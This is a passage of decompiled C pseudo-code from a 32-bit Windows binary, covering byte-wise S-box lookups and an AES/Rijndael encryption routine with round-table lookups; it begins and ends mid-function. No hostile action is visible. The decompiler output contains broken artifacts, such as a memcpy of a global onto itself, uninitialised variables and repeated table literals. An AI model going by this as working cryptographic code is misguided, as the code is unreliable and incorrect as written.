(int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x403403
    *(char *)(result + 3) = v66 ^ (char)v62;
    uint32_t v67 = *(int32_t *)(v61 + 4); // 0x40340f
    char v68 = *(char *)(v12 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x403412
    *(char *)(result + 4) = v68 ^ (char)(v67 / 0x1000000);
    char v69 = *(char *)(v13 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x40342b
    *(char *)(result + 5) = v69 ^ (char)(v67 / 0x10000);
    char v70 = *(char *)(v14 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x403444
    *(char *)(result + 6) = v70 ^ (char)(v67 / 256);
    char v71 = *(char *)((v24 & 255) + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x403459
    *(char *)(result + 7) = v71 ^ (char)v67;
    uint32_t v72 = *(int32_t *)(v61 + 8); // 0x403465
    char v73 = *(char *)(v15 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x403468
    *(char *)(result + 8) = v73 ^ (char)(v72 / 0x1000000);
    char v74 = *(char *)(v16 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x403481
    *(char *)(result + 9) = v74 ^ (char)(v72 / 0x10000);
    char v75 = *(char *)((v22 / 256 & 255) + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x403499
    *(char *)(result + 10) = v75 ^ (char)(v72 / 256);
    char v76 = *(char *)((v23 & 255) + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4034ac
    *(char *)(result + 11) = v76 ^ (char)v72;
    uint32_t v77 = *(int32_t *)(v61 + 12); // 0x4034b8
    char v78 = *(char *)(v17 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4034c8
    *(char *)(result + 12) = v78 ^ (char)(v77 / 0x1000000);
    char v79 = *(char *)(v18 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4034dd
    *(char *)(result + 13) = v79 ^ (char)(v77 / 0x10000);
    char v80 = *(char *)(v19 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4034f2
    *(char *)(result + 14) = v80 ^ (char)(v77 / 256);
    char v81 = *(char *)((v22 & 255) + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x4034fe
    *(char *)(result + 15) = v81 ^ (char)v77;
    return result;
}

// Address range: 0x40350f - 0x403797
// Used cryptographic patterns:
//  - AES_Rijndael_S___ARIA_S1 (8-bit)
//  - Rijndael_Te0__0xc66363a5U_ (32-bit, little endian)
//  - Rijndael_Te1__0xa5c66363U_ (32-bit, little endian)
//  - Rijndael_Te2__0x63a5c663U_ (32-bit, little endian)
//  - Rijndael_Te3__0x6363a5c6U_ (32-bit, little endian)
int32_t function_40350f(int32_t a1, int32_t a2) {
    // 0x40350f
    int32_t v1; // 0x40350f
    if (*(char *)(v1 + 4) == 0) {
        // 0x403520
        int32_t v2; // bp-56, 0x40350f
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v2);
        _CxxThrowException(&v2, &g17);
        // UNREACHABLE
    }
    uint32_t v3 = *(int32_t *)(v1 + 972); // 0x40353c
    if (v3 == 16) {
        // 0x403790
        return function_402e7e(a1, a2);
    }
    int64_t v4 = (0x100000000 * (int64_t)(v3 / 0x80000000) | (int64_t)v3) / 4; // 0x40355d
    int32_t v5 = v4; // 0x40355d
    int32_t v6 = v5 == 4 ? 0 : v5 != 6 ? 64 : 32; // 0x403570
    int32_t v7 = *(int32_t *)(v6 + (int32_t)&g8); // 0x403577
    int32_t v8 = *(int32_t *)(v6 + (int32_t)&g10); // 0x403580
    int32_t v9 = *(int32_t *)(v6 + (int32_t)&g12); // 0x403586
    if (v5 >= 1) {
        int32_t v10 = v5; // 0x4035a3
        int32_t v11 = v1 + 8; // 0x4035a3
        int32_t v12 = v1 + 1108; // 0x4035a3
        int32_t v13 = a1; // 0x4035a3
        int32_t v14 = 0x1000000 * (int32_t)*(char *)v13; // 0x4035a9
        int32_t * v15 = (int32_t *)v12; // 0x4035ad
        *v15 = v14;
        int32_t v16 = 0x10000 * (int32_t)*(char *)(v13 + 1) | v14; // 0x4035b5
        *v15 = v16;
        int32_t v17 = 256 * (int32_t)*(char *)(v13 + 2) | v16; // 0x4035bc
        *v15 = v17;
        int32_t v18 = v17 | (int32_t)*(char *)(v13 + 3); // 0x4035c4
        *v15 = v18;
        *v15 = v18 ^ *(int32_t *)v11;
        v10--;
        v11 += 4;
        v12 += 4;
        v13 += 4;
        while (v10 != 0) {
            // 0x4035a6
            v14 = 0x1000000 * (int32_t)*(char *)v13;
            v15 = (int32_t *)v12;
            *v15 = v14;
            v16 = 0x10000 * (int32_t)*(char *)(v13 + 1) | v14;
            *v15 = v16;
            v17 = 256 * (int32_t)*(char *)(v13 + 2) | v16;
            *v15 = v17;
            v18 = v17 | (int32_t)*(char *)(v13 + 3);
            *v15 = v18;
            *v15 = v18 ^ *(int32_t *)v11;
            v10--;
            v11 += 4;
            v12 += 4;
            v13 += 4;
        }
    }
    int32_t * v19 = (int32_t *)(v1 + 1040); // 0x4035dd
    uint32_t v20 = *v19; // 0x4035dd
    int32_t v21 = v20; // 0x4035e6
    int32_t result = 1; // 0x4035e6
    if (v20 >= 2) {
        // 0x4035ec
        int32_t v22; // bp-68, 0x40350f
        int32_t v23 = &v22; // 0x4035dc
        int32_t v24 = v1 + 1076;
        int64_t v25 = v4 & 0xffffffff;
        int32_t v26 = v1 + 1109;
        int32_t v27 = v1 + 1108;
        int32_t v28 = v1 + 1110;
        int32_t v29 = 1; // 0x4035ef
        int32_t v30 = v1 + 40; // 0x4035ef
        int32_t v31 = v30; // 0x4035f4
        int32_t v32 = v24; // 0x4035f4
        int32_t v33; // 0x40350f
        int32_t v34; // 0x40350f
        int32_t v35; // 0x40350f
        int32_t v36; // 0x403625
        unsigned char v37; // 0x40362e
        int32_t v38; // 0x403638
        int32_t v39; // 0x403640
        int32_t v40; // 0x40364f
        int32_t v41; // 0x403656
        unsigned char v42; // 0x403665
        int32_t v43; // 0x40366c
        unsigned char v44; // 0x403675
        int32_t v45; // 0x403678
        int32_t v46; // 0x403686
        int32_t v47; // 0x403690
        if (v5 >= 1) {
            v34 = v7;
            v36 = v34 + v8 - v7;
            v37 = *(char *)(v26 + 4 * (int32_t)((0x100000000 * (int64_t)(v36 >> 31) | (int64_t)v36) % v25));
            v38 = v34 + v9 - v7;
            v39 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v38 >> 31) | (int64_t)v38) % v25) + v27);
            v40 = *(int32_t *)(4 * (int32_t)v37 + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc);
            v41 = *(int32_t *)((4 * v39 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc);
            v42 = *(char *)(v28 + 4 * (int32_t)((0x100000000 * (int64_t)(v34 >> 31) | (int64_t)v34) % v25));
            v43 = *(int32_t *)(4 * (int32_t)v42 + (int32_t)&Rijndael_Te1__0xa5c66363U__at_408ffc);
            v44 = *(char *)(v32 + 35);
            v45 = *(int32_t *)(4 * (int32_t)v44 + (int32_t)&Rijndael_Te0__0xc66363a5U__at_408bfc);
            v46 = *(int32_t *)v31;
            *(int32_t *)v32 = v41 ^ v40 ^ v43 ^ v45 ^ v46;
            v47 = v5 - 1;
            v33 = v34 + 1;
            v31 += 4;
            v35 = v47;
            v32 += 4;
            while (v47 != 0) {
                // 0x40361f
                v34 = v33;
                v36 = v34 + v8 - v7;
                v37 = *(char *)(v26 + 4 * (int32_t)((0x100000000 * (int64_t)(v36 >> 31) | (int64_t)v36) % v25));
                v38 = v34 + v9 - v7;
                v39 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v38 >> 31) | (int64_t)v38) % v25) + v27);
                v40 = *(int32_t *)(4 * (int32_t)v37 + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc);
                v41 = *(int32_t *)((4 * v39 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc);
                v42 = *(char *)(v28 + 4 * (int32_t)((0x100000000 * (int64_t)(v34 >> 31) | (int64_t)v34) % v25));
                v43 = *(int32_t *)(4 * (int32_t)v42 + (int32_t)&Rijndael_Te1__0xa5c66363U__at_408ffc);
                v44 = *(char *)(v32 + 35);
                v45 = *(int32_t *)(4 * (int32_t)v44 + (int32_t)&Rijndael_Te0__0xc66363a5U__at_408bfc);
                v46 = *(int32_t *)v31;
                *(int32_t *)v32 = v41 ^ v40 ^ v43 ^ v45 ^ v46;
                v47 = v35 - 1;
                v33 = v34 + 1;
                v31 += 4;
                v35 = v47;
                v32 += 4;
            }
        }
        // 0x403695
        *(int32_t *)(v23 - 4) = 4 * v5;
        *(int32_t *)(v23 - 8) = v24;
        *(int32_t *)(v23 - 12) = v27;
        memcpy(&g54, &g54, (int32_t)&g54);
        v29++;
        uint32_t v48 = *v19; // 0x4036bb
        v30 += 32;
        v21 = v48;
        result = v29;
        while (v29 < v48) {
            // 0x4035f2
            v31 = v30;
            v32 = v24;
            if (v5 >= 1) {
                v34 = v7;
                v36 = v34 + v8 - v7;
                v37 = *(char *)(v26 + 4 * (int32_t)((0x100000000 * (int64_t)(v36 >> 31) | (int64_t)v36) % v25));
                v38 = v34 + v9 - v7;
                v39 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v38 >> 31) | (int64_t)v38) % v25) + v27);
                v40 = *(int32_t *)(4 * (int32_t)v37 + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc);
                v41 = *(int32_t *)((4 * v39 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc);
                v42 = *(char *)(v28 + 4 * (int32_t)((0x100000000 * (int64_t)(v34 >> 31) | (int64_t)v34) % v25));
                v43 = *(int32_t *)(4 * (int32_t)v42 + (int32_t)&Rijndael_Te1__0xa5c66363U__at_408ffc);
                v44 = *(char *)(v32 + 35);
                v45 = *(int32_t *)(4 * (int32_t)v44 + (int32_t)&Rijndael_Te0__0xc66363a5U__at_408bfc);
                v46 = *(int32_t *)v31;
                *(int32_t *)v32 = v41 ^ v40 ^ v43 ^ v45 ^ v46;
                v47 = v5 - 1;
                v33 = v34 + 1;
                v31 += 4;
                v35 = v47;
                v32 += 4;
                while (v47 != 0) {
                    // 0x40361f
                    v34 = v33;
                    v36 = v34 + v8 - v7;
                    v37 = *(char *)(v26 + 4 * (int32_t)((0x100000000 * (int64_t)(v36 >> 31) | (int64_t)v36) % v25));
                    v38 = v34 + v9 - v7;
                    v39 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v38 >> 31) | (int64_t)v38) % v25) + v27);
                    v40 = *(int32_t *)(4 * (int32_t)v37 + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc);
                    v41 = *(int32_t *)((4 * v39 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc);
                    v42 = *(char *)(v28 + 4 * (int32_t)((0x100000000 * (int64_t)(v34 >> 31) | (int64_t)v34) % v25));
                    v43 = *(int32_t *)(4 * (int32_t)v42 + (int32_t)&Rijndael_Te1__0xa5c66363U__at_408ffc);
                    v44 = *(char *)(v32 + 35);
                    v45 = *(int32_t *)(4 * (int32_t)v44 + (int32_t)&Rijndael_Te0__0xc66363a5U__at_408bfc);
                    v46 = *(int32_t *)v31;
                    *(int32_t *)v32 = v41 ^ v40 ^ v43 ^ v45 ^ v46;
                    v47 = v35 - 1;
                    v33 = v34 + 1;
                    v31 += 4;
                    v35 = v47;
                    v32 += 4;
                }
            }
            // 0x403695
            *(int32_t *)(v23 - 4) = 4 * v5;
            *(int32_t *)(v23 - 8) = v24;
